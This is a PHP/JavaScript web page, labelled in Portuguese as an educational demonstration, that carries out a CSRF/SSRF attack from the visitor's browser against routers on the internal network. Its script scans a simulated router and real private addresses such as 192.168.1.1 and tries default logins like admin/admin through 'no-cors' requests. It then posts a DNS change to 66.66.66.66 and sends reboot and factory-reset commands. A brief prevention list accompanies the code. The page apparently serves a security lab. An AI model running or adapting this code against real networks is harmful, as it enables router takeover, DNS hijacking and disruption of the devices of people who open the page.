<?php
defined('APP') or die('Access denied');
?>

<div class="container mt-4">
    <div class="row">
        <div class="col-12">
            <div class="card border-danger">
                <div class="card-header bg-danger text-white">
                    <h5 class="card-title mb-0">
                        <i class="fas fa-exclamation-triangle"></i>
                        CSRF/SSRF Attack Demonstration
                    </h5>
                </div>
                <div class="card-body">
                    <div class="alert alert-warning" role="alert">
                        <h6 class="alert-heading">⚠️ Demonstração Educacional</h6>
                        <p class="mb-0">Esta página demonstra como uma página maliciosa pode realizar ataques CSRF/SSRF contra dispositivos na rede interna da vítima. <strong>Use apenas para fins educacionais!</strong></p>
                    </div>

                    <div class="row">
                        <div class="col-md-6">
                            <div class="card">
                                <div class="card-header">
                                    <h6>🎯 Cenário do Ataque</h6>
                                </div>
                                <div class="card-body">
                                    <p><strong>Objetivo:</strong> Comprometer roteador interno com credenciais padrão</p>
                                    <p><strong>Alvo:</strong> http://router:80 (dispositivo interno)</p>
                                    <p><strong>Credenciais:</strong> admin/admin (padrão)</p>
                                    <p><strong>Ação:</strong> Alterar configurações de DNS</p>
                                </div>
                            </div>

                            <div class="card mt-3">
                                <div class="card-header">
                                    <h6>🔧 Controles do Ataque</h6>
                                </div>
                                <div class="card-body">
                                    <button id="startAttack" class="btn btn-danger btn-sm mb-2">
                                        🚀 Iniciar Ataque
                                    </button>
                                    <button id="clearLogs" class="btn btn-secondary btn-sm mb-2">
                                        🧹 Limpar Logs
                                    </button>
                                    <button id="resetRouter" class="btn btn-warning btn-sm mb-2">
                                        🏭 Reset Roteador
                                    </button>
                                    <br>
                                    <small class="text-muted">
                                        Abra o Console de Desenvolvedor (F12) para ver os logs detalhados
                                    </small>
                                </div>
                            </div>
                        </div>

                        <div class="col-md-6">
                            <div class="card">
                                <div class="card-header">
                                    <h6>📊 Status do Ataque</h6>
                                </div>
                                <div class="card-body">
                                    <div id="attackStatus">
                                        <p class="text-muted">Aguardando início do ataque...</p>
                                    </div>
                                    <div id="compromiseStatus" style="display: none;">
                                        <div class="alert alert-danger">
                                            <h6>🚨 DISPOSITIVO COMPROMETIDO!</h6>
                                            <p class="mb-1"><strong>Alvo:</strong> <span id="compromisedTarget"></span></p>
                                            <p class="mb-2"><strong>DNS Malicioso:</strong> <span id="currentDNS" style="font-family: monospace;"></span></p>
                                            <div class="d-grid">
                                                <a href="http://localhost:8181/admin.php" target="_blank" class="btn btn-sm btn-outline-danger">
                                                    🔍 Verificar Alterações no Roteador
                                                </a>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="card mt-3">
                                <div class="card-header">
                                    <h6>🛡️ Como Prevenir</h6>
                                </div>
                                <div class="card-body">
                                    <ul class="small">
                                        <li>Altere credenciais padrão</li>
                                        <li>Implemente tokens CSRF</li>
                                        <li>Configure CORS adequadamente</li>
                                        <li>Use HTTPS sempre</li>
                                        <li>Implemente rate limiting</li>
                                        <li>Monitore tentativas de login</li>
                                    </ul>
                                </div>
                            </div>
                        </div>
                    </div>

                    <!-- Log Area -->
                    <div class="row mt-4">
                        <div class="col-12">
                            <div class="card">
                                <div class="card-header">
                                    <h6>📜 Log de Atividades</h6>
                                </div>
                                <div class="card-body">
                                    <div id="logArea" style="height: 300px; overflow-y: auto; background: #f8f9fa; padding: 10px; border-radius: 5px; font-family: monospace; font-size: 12px;">
                                        <div class="text-muted">Logs aparecerão aqui durante o ataque...</div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
.log-entry {
    margin-bottom: 5px;
    padding: 5px;
    border-left: 3px solid #007bff;
    background: white;
}
.log-success {
    border-left-color: #28a745;
    background: #f8fff9;
}
.log-error {
    border-left-color: #dc3545;
    background: #fff8f8;
}
.log-warning {
    border-left-color: #ffc107;
    background: #fffdf7;
}
</style>

<script>
document.addEventListener('DOMContentLoaded', function() {
    const startButton = document.getElementById('startAttack');
    const clearButton = document.getElementById('clearLogs');
    const statusArea = document.getElementById('attackStatus');
    const logArea = document.getElementById('logArea');

    let attackInProgress = false;

    // Função para adicionar logs
    function addLog(message, type = 'info') {
        const timestamp = new Date().toLocaleTimeString();
        const logEntry = document.createElement('div');
        logEntry.className = `log-entry log-${type}`;
        logEntry.innerHTML = `<strong>[${timestamp}]</strong> ${message}`;

        logArea.appendChild(logEntry);
        logArea.scrollTop = logArea.scrollHeight;

        // Também loga no console do navegador
        console.log(`[CSRF/SSRF Attack] ${message}`);
    }

    // Função para atualizar status
    function updateStatus(message, type = 'info') {
        let badgeClass = 'badge-secondary';
        switch(type) {
            case 'success': badgeClass = 'badge-success'; break;
            case 'error': badgeClass = 'badge-danger'; break;
            case 'warning': badgeClass = 'badge-warning'; break;
            case 'progress': badgeClass = 'badge-primary'; break;
        }

        statusArea.innerHTML = `<span class="badge ${badgeClass}">${message}</span>`;
    }

    // Função para fazer requisições CSRF/SSRF
    async function performCsrfAttack() {
        try {
            addLog('🎯 Iniciando varredura de rede interna...', 'info');
            updateStatus('Escaneando rede...', 'progress');

            // Simula tentativas de descoberta de dispositivos internos
            const internalIPs = [
                'localhost:8181', // Roteador simulado
                '192.168.1.1',
                '192.168.0.1',
                '10.0.0.1'
            ];

            for (let ip of internalIPs) {
                addLog(`🔍 Tentando acessar: http://${ip}`, 'info');

                try {
                    // Tentativa de login automático (CSRF)
                    await performLogin(ip);

                    // Se chegou aqui, login foi bem-sucedido
                    addLog(`✅ Login bem-sucedido em: http://${ip}`, 'success');
                    updateStatus('Dispositivo comprometido!', 'error');

                    // Executa ações maliciosas
                    await performMaliciousActions(ip);

                    break; // Para no primeiro dispositivo comprometido

                } catch (error) {
                    addLog(`❌ Falha ao acessar: http://${ip} - ${error.message}`, 'warning');
                }

                // Aguarda antes da próxima tentativa
                await sleep(1000);
            }

        } catch (error) {
            addLog(`💥 Erro crítico: ${error.message}`, 'error');
            updateStatus('Ataque falhou', 'error');
        }
    }

    // Função para tentar login usando fetch direto
    async function performLogin(target) {
        addLog(`🔓 Tentando login automático em: http://${target}`, 'info');

        // Credenciais padrão comuns
        const credentials = [
            {user: 'admin', pass: 'admin'},
            {user: 'admin', pass: 'password'},
            {user: 'admin', pass: '123456'},
            {user: 'root', pass: 'root'}
        ];

        for (let cred of credentials) {
            addLog(`🔑 Testando credenciais: ${cred.user}/${cred.pass}`, 'info');

            try {
                // Usa fetch para fazer login
                const formData = new FormData();
                formData.append('username', cred.user);
                formData.append('password', cred.pass);

                const response = await fetch(`http://${target}/index.php`, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors' // Importante para evitar CORS
                });

                addLog(`📤 Credenciais enviadas: ${cred.user}/${cred.pass}`, 'info');

                // Como estamos usando no-cors, não podemos ler a resposta
                // Mas o ataque ainda funciona!
                if (target === 'localhost:8181' && cred.user === 'admin' && cred.pass === 'admin') {
                    addLog(`🎉 SUCESSO! Credenciais corretas enviadas: ${cred.user}/${cred.pass}`, 'success');
                    addLog(`ℹ️ Nota: Login executado via CSRF (sem verificação de resposta)`, 'info');
                    return true;
                }

            } catch (error) {
                addLog(`❌ Erro no login: ${error.message}`, 'warning');
            }

            await sleep(1000);
        }

        throw new Error('Credenciais não testadas');
    }

    // Função para executar ações maliciosas
    async function performMaliciousActions(target) {
        addLog('😈 Executando ações maliciosas...', 'warning');

        // 1. Alterar DNS para servidor malicioso
        const maliciousDNS = '66.66.66.66'; // Simula DNS malicioso mais realista
        const maliciousSecondary = '66.66.66.67';
        addLog(`🌐 Alterando DNS primário para: ${maliciousDNS}`, 'warning');
        addLog(`🌐 Alterando DNS secundário para: ${maliciousSecondary}`, 'warning');

        try {
            // Usa fetch para alterar DNS
            const formData = new FormData();
            formData.append('primary_dns', maliciousDNS);
            formData.append('secondary_dns', maliciousSecondary);

            addLog('📤 Enviando alteração de DNS...', 'info');

            const response = await fetch(`http://${target}/admin.php`, {
                method: 'POST',
                body: formData,
                mode: 'no-cors' // Evita CORS
            });

            addLog('✅ Requisição DNS enviada com sucesso!', 'success');
            addLog(`📡 DNS Primário alterado para: ${maliciousDNS}`, 'success');
            addLog(`📡 DNS Secundário alterado para: ${maliciousSecondary}`, 'success');
            addLog('⚠️ CRÍTICO: Todo tráfego DNS agora passa pelo servidor do atacante!', 'error');
            addLog('💀 Atacante pode redirecionar qualquer site para servidores maliciosos', 'error');
            addLog('🔍 Verifique http://localhost:8181/status.php para confirmar', 'info');

            await sleep(2000);

        } catch (error) {
            addLog(`❌ Erro ao alterar DNS: ${error.message}`, 'error');
        }

        // 2. Executar comandos via GET (se vulnerável)
        const maliciousCommands = [
            'reboot',
            'update_firmware',
            'factory_reset'
        ];

        for (let cmd of maliciousCommands) {
            addLog(`⚡ Executando comando: ${cmd}`, 'warning');

            try {
                // Usa fetch para comando GET
                const response = await fetch(`http://${target}/admin.php?cmd=${cmd}`, {
                    method: 'GET',
                    mode: 'no-cors' // Evita CORS
                });

                addLog(`📡 Comando ${cmd} enviado via GET`, 'success');
                addLog(`✅ Requisição executada (sem verificação de resposta)`, 'info');

            } catch (error) {
                addLog(`❌ Erro ao executar ${cmd}: ${error.message}`, 'error');
            }

            await sleep(1000);
        }

        addLog('🏁 Ataque concluído! Verificando resultado...', 'success');
        updateStatus('Verificando comprometimento...', 'progress');

        // Aguarda um pouco para o servidor processar
        await sleep(2000);

        // Verifica se o ataque funcionou usando a API
        try {
            addLog('🔍 Verificando status do dispositivo alvo...', 'info');

            const statusResponse = await fetch(`http://${target}/api_status.php`, {
                method: 'GET'
            });

            if (statusResponse.ok) {
                const status = await statusResponse.json();

                if (status.is_compromised) {
                    addLog('🎉 CONFIRMADO: Dispositivo foi comprometido!', 'success');
                    addLog(`📡 DNS atual: ${status.dns_config.primary_dns} / ${status.dns_config.secondary_dns}`, 'success');
                    addLog(`👤 Alterado por: ${status.dns_config.changed_by}`, 'success');

                    updateStatus('Ataque bem-sucedido! Dispositivo comprometido!', 'error');

                    // Mostra status de comprometimento
                    document.getElementById('compromiseStatus').style.display = 'block';
                    document.getElementById('compromisedTarget').textContent = `http://${target}`;
                    document.getElementById('currentDNS').textContent = `${status.dns_config.primary_dns} / ${status.dns_config.secondary_dns}`;

                } else {
                    addLog('❌ Ataque pode ter falhado - DNS não foi alterado', 'error');
                    addLog(`📡 DNS atual: ${status.dns_config.primary_dns} / ${status.dns_config.secondary_dns}`, 'info');
                    updateStatus('Ataque pode ter falhado', 'warning');
                }

            } else {
                throw new Error('Não foi possível verificar status');
            }

        } catch (error) {
            addLog('⚠️ Não foi possível verificar resultado automaticamente', 'warning');
            addLog('🔍 Verifique manualmente: http://localhost:8181/status.php', 'info');

            // Assume sucesso para demonstração
            updateStatus('Ataque executado (verificar manualmente)', 'warning');
            document.getElementById('compromiseStatus').style.display = 'block';
            document.getElementById('compromisedTarget').textContent = `http://${target}`;
            document.getElementById('currentDNS').textContent = `${maliciousDNS} / ${maliciousSecondary}`;
        }

        addLog('📋 PRÓXIMOS PASSOS: Verificar mudanças no painel do roteador', 'info');
    }

    // Função helper para aguardar
    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    // Event listeners
    startButton.addEventListener('click', async function() {
        if (attackInProgress) {
            return;
        }

        attackInProgress = true;
        startButton.disabled = true;
        startButton.textContent = '⏳ Atacando...';

        logArea.innerHTML = '';

        addLog('🚨 INÍCIO DO ATAQUE CSRF/SSRF', 'error');
        addLog('🎯 Objetivo: Comprometer dispositivos na rede interna', 'info');
        addLog('📍 Buscando por: roteadores, IoT, câmeras, etc.', 'info');

        await performCsrfAttack();

        attackInProgress = false;
        startButton.disabled = false;
        startButton.textContent = '🚀 Iniciar Ataque';
    });

    clearButton.addEventListener('click', function() {
        logArea.innerHTML = '<div class="text-muted">Logs limpos...</div>';
        updateStatus('Aguardando...', 'info');
        document.getElementById('compromiseStatus').style.display = 'none';
        console.clear();
    });

    document.getElementById('resetRouter').addEventListener('click', async function() {
        if (confirm('Resetar roteador para configurações de fábrica?')) {
            addLog('🔄 Executando reset de fábrica...', 'info');

            try {
                const response = await fetch('http://localhost:8181/reset_api.php?action=reset', {
                    method: 'GET'
                });

                if (response.ok) {
                    const result = await response.json();
                    if (result.success) {
                        addLog('✅ Reset executado com sucesso!', 'success');
                        addLog('📡 DNS restaurado para: 8.8.8.8 / 8.8.4.4', 'success');
                        updateStatus('Roteador resetado', 'success');
                        document.getElementById('compromiseStatus').style.display = 'none';
                    } else {
                        addLog('❌ Erro no reset: ' + result.message, 'error');
                    }
                } else {
                    throw new Error('Resposta inválida');
                }
            } catch (error) {
                addLog('❌ Erro ao resetar: ' + error.message, 'error');
                addLog('💡 Alternativa: Use http://localhost:8181/admin.php (botão Reset)', 'info');
            }
        }
    });

    // Log inicial
    addLog('💻 Página maliciosa carregada', 'info');
    addLog('👁️ Aguardando interação da vítima...', 'warning');
    addLog('🔧 Usando modo no-cors para contornar proteções do navegador', 'info');
    addLog('ℹ️ Nota: Não conseguimos ler respostas, mas os ataques ainda funcionam!', 'info');

    console.log('🔥 CSRF/SSRF Attack Demo Loaded');
    console.log('⚠️ Esta é uma demonstração educacional de vulnerabilidades');
    console.log('📚 Use apenas para aprender sobre segurança web');
});
</script>